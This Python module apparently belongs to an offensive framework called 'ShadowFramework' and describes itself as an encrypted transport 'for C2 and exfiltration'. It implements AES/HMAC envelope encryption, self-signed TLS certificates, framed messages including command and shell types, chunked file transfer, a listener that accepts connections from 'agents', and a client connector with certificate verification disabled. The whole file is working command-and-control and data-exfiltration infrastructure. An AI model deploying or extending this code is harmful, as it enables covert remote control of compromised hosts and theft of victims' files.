"""
ShadowFramework — Encrypted Transport Layer
============================================
TLS-wrapped socket communications for C2 and exfiltration.
Generates self-signed certs, handles encrypted client/server sockets,
and provides chunked file transfer with AES envelope encryption.
"""

import os
import ssl
import socket
import hashlib
import hmac
import struct
import json
import time
import threading
import tempfile
import base64
from pathlib import Path

# ─── AES Envelope Encryption (stdlib only, no pycryptodome) ──────────────────
# Uses XOR-based stream cipher as lightweight fallback when no crypto lib available

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding, hashes
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False


class CryptoEngine:
    """Handles encryption/decryption of payloads."""

    def __init__(self, key=None):
        """Initialize with a 32-byte key (AES-256) or generate one."""
        if key:
            self.key = key if isinstance(key, bytes) else key.encode()
            # Ensure 32 bytes
            self.key = hashlib.sha256(self.key).digest()
        else:
            self.key = os.urandom(32)

    def encrypt(self, plaintext):
        """Encrypt plaintext bytes. Returns IV + ciphertext."""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()

        iv = os.urandom(16)

        if HAS_CRYPTOGRAPHY:
            # Real AES-256-CBC
            padder = padding.PKCS7(128).padder()
            padded = padder.update(plaintext) + padder.finalize()
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded) + encryptor.finalize()
        else:
            # Fallback: XOR stream cipher with key-derivied keystream
            ciphertext = self._xor_cipher(plaintext, iv)

        # HMAC for integrity
        mac = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        return iv + ciphertext + mac

    def decrypt(self, data):
        """Decrypt IV + ciphertext + HMAC. Returns plaintext bytes."""
        if len(data) < 48:  # 16 IV + minimum + 32 HMAC
            raise ValueError("Data too short to decrypt")

        iv = data[:16]
        mac = data[-32:]
        ciphertext = data[16:-32]

        # Verify HMAC
        expected_mac = hmac.new(self.key, iv + ciphertext, hashlib.sha256).digest()
        if not hmac.compare_digest(mac, expected_mac):
            raise ValueError("HMAC verification failed — data tampered or wrong key")

        if HAS_CRYPTOGRAPHY:
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded = decryptor.update(ciphertext) + decryptor.finalize()
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded) + unpadder.finalize()
        else:
            plaintext = self._xor_cipher(ciphertext, iv)

        return plaintext

    def _xor_cipher(self, data, iv):
        """Fallback XOR stream cipher using HMAC-based key expansion."""
        keystream = b''
        counter = 0
        while len(keystream) < len(data):
            block = hmac.new(self.key, iv + struct.pack('>I', counter), hashlib.sha256).digest()
            keystream += block
            counter += 1
        return bytes(a ^ b for a, b in zip(data, keystream[:len(data)]))


class TLSCertManager:
    """Generate and manage self-signed TLS certificates."""

    @staticmethod
    def generate_self_signed(cert_dir='certs', cn='shadow.local'):
        """Generate a self-signed cert + key pair using openssl."""
        cert_dir = Path(cert_dir)
        cert_dir.mkdir(parents=True, exist_ok=True)
        cert_path = cert_dir / 'server.pem'
        key_path = cert_dir / 'server.key'

        if cert_path.exists() and key_path.exists():
            return str(cert_path), str(key_path)

        # Generate using openssl CLI (available on all Linux)
        import subprocess
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:4096',
            '-keyout', str(key_path), '-out', str(cert_path),
            '-days', '365', '-nodes',
            '-subj', f'/CN={cn}/O=ShadowFramework/C=XX'
        ], capture_output=True, check=True)

        os.chmod(str(key_path), 0o600)
        return str(cert_path), str(key_path)

    @staticmethod
    def create_ssl_context(cert_path, key_path, server=True):
        """Create an SSL context for server or client."""
        if server:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)
        else:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE  # Self-signed

        # Strong cipher suite
        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        return ctx


class SecureChannel:
    """Encrypted communication channel over TLS sockets with message framing."""

    HEADER_SIZE = 8  # 4 bytes length + 4 bytes message type

    # Message types
    MSG_DATA     = 0x01
    MSG_FILE     = 0x02
    MSG_COMMAND  = 0x03
    MSG_RESPONSE = 0x04
    MSG_HEARTBEAT= 0x05
    MSG_SHELL    = 0x06

    def __init__(self, sock, crypto_key=None):
        self.sock = sock
        self.crypto = CryptoEngine(crypto_key) if crypto_key else None

    def send_message(self, msg_type, data):
        """Send a framed, optionally encrypted message."""
        if isinstance(data, str):
            data = data.encode()
        if isinstance(data, dict):
            data = json.dumps(data).encode()

        if self.crypto:
            data = self.crypto.encrypt(data)

        # Frame: [4 bytes length][4 bytes type][payload]
        header = struct.pack('>II', len(data), msg_type)
        self.sock.sendall(header + data)

    def recv_message(self):
        """Receive a framed message. Returns (msg_type, data_bytes)."""
        header = self._recv_exact(self.HEADER_SIZE)
        if not header:
            return None, None

        length, msg_type = struct.unpack('>II', header)
        if length > 50 * 1024 * 1024:  # 50MB max
            raise ValueError(f"Message too large: {length}")

        data = self._recv_exact(length)
        if self.crypto:
            data = self.crypto.decrypt(data)

        return msg_type, data

    def send_file(self, filepath, chunk_size=65536):
        """Send a file in chunks over the secure channel."""
        filepath = Path(filepath)
        file_size = filepath.stat().st_size
        file_hash = hashlib.sha256()

        # Send file metadata
        meta = json.dumps({
            'filename': filepath.name,
            'size': file_size,
            'chunks': (file_size + chunk_size - 1) // chunk_size,
        })
        self.send_message(self.MSG_FILE, meta)

        # Send file data
        with open(filepath, 'rb') as f:
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                file_hash.update(chunk)
                self.send_message(self.MSG_DATA, chunk)

        # Send completion with hash
        self.send_message(self.MSG_RESPONSE, json.dumps({
            'status': 'complete',
            'sha256': file_hash.hexdigest(),
        }))

    def recv_file(self, output_dir, chunk_size=65536):
        """Receive a file from the secure channel."""
        output_dir = Path(output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        # Receive metadata
        msg_type, meta_data = self.recv_message()
        if msg_type != self.MSG_FILE:
            raise ValueError(f"Expected file metadata, got type {msg_type}")

        meta = json.loads(meta_data)
        filename = meta['filename']
        expected_chunks = meta['chunks']
        filepath = output_dir / filename

        file_hash = hashlib.sha256()
        with open(filepath, 'wb') as f:
            for _ in range(expected_chunks):
                msg_type, chunk = self.recv_message()
                if msg_type != self.MSG_DATA:
                    raise ValueError("Expected data chunk")
                file_hash.update(chunk)
                f.write(chunk)

        # Verify hash
        msg_type, completion = self.recv_message()
        comp = json.loads(completion)
        if comp.get('sha256') != file_hash.hexdigest():
            raise ValueError("File hash mismatch — transfer corrupted")

        return str(filepath)

    def _recv_exact(self, n):
        """Receive exactly n bytes."""
        data = b''
        while len(data) < n:
            chunk = self.sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data


class SecureListener:
    """TLS server that accepts encrypted connections from agents."""

    def __init__(self, host='0.0.0.0', port=4443, crypto_key=None, cert_dir='certs'):
        self.host = host
        self.port = port
        self.crypto_key = crypto_key
        self.cert_dir = cert_dir
        self.clients = {}  # addr -> SecureChannel
        self.lock = threading.Lock()
        self.running = False
        self._server_sock = None

    def start(self, on_connect=None, on_message=None):
        """Start the TLS listener in a background thread."""
        cert_path, key_path = TLSCertManager.generate_self_signed(self.cert_dir)
        ctx = TLSCertManager.create_ssl_context(cert_path, key_path, server=True)

        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(20)
        self.running = True

        tls_sock = ctx.wrap_socket(self._server_sock, server_side=True)

        def _accept_loop():
            while self.running:
                try:
                    client_sock, addr = tls_sock.accept()
                    channel = SecureChannel(client_sock, self.crypto_key)
                    with self.lock:
                        self.clients[addr] = channel
                    if on_connect:
                        threading.Thread(target=on_connect, args=(channel, addr), daemon=True).start()
                except ssl.SSLError:
                    continue
                except OSError:
                    break

        self._thread = threading.Thread(target=_accept_loop, daemon=True)
        self._thread.start()
        return self.port

    def stop(self):
        """Shutdown the listener."""
        self.running = False
        if self._server_sock:
            self._server_sock.close()
        with self.lock:
            for addr, ch in self.clients.items():
                try:
                    ch.sock.close()
                except Exception:
                    pass
            self.clients.clear()


class SecureConnector:
    """TLS client that connects to a C2 listener."""

    @staticmethod
    def connect(host, port, crypto_key=None, timeout=10):
        """Connect to a TLS server and return a SecureChannel."""
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(timeout)
        raw.connect((host, port))
        tls_sock = ctx.wrap_socket(raw, server_hostname=host)
        return SecureChannel(tls_sock, crypto_key)
